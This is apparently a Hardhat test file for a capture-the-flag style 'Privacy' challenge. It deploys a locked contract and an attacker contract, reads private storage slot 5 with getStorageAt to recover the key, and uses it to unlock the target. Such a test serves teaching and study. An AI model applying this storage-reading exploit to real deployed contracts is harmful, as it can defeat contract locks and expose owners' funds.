const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Privacy", function () {
  let Privacy, privacy, PrivacyAttack, privacyAttack;
  let deployer, attacker, alice, signers;
  let data0, data1, data2;
  const data0Str = "First Data";
  const data1Str = "Second Data";
  const data2Str = "Third Data";

  beforeEach(async function () {
    [deployer, attacker, alice, signers] = await ethers.getSigners();
    data0 = stringToBytesN(data0Str, 32);
    data1 = stringToBytesN(data1Str, 32);
    data2 = stringToBytesN(data2Str, 32);
    Privacy = await ethers.getContractFactory("Privacy");
    privacy = await Privacy.deploy([data0, data1, data2]);
    PrivacyAttack = await ethers.getContractFactory("PrivacyAttack");
    privacyAttack = await PrivacyAttack.connect(attacker).deploy();
  });

  describe("deployment", function () {
    it("should set the attacker", async function () {
      expect(await privacyAttack.attacker()).to.equal(attacker.address);
    });
  });

  describe("#attack", function () {
    it("should be reverted if non-attacker tries", async function () {
      await expect(
        privacyAttack.connect(alice).attack(privacy.address, data2)
      ).to.be.revertedWith(
        "PrivacyAttack: NOT_OWNER"
      );
    });

    it("should unlock Privacy contract if valid password given", async function () {
      const data2State = await ethers.provider.getStorageAt(privacy.address, 5);
      await privacyAttack.connect(attacker).attack(privacy.address, data2State);
      expect(await privacy.locked()).to.equal(false);
    });
  });

  function stringToBytesN(str, length) {
    let bytes = ethers.utils.toUtf8Bytes(str);
    if (bytes.length > length - 1) { throw new Error('too long') };
    let zeros = "0x".concat("00".repeat(length));
    return ethers.utils.concat([bytes, zeros]).slice(0, length);
  }
});
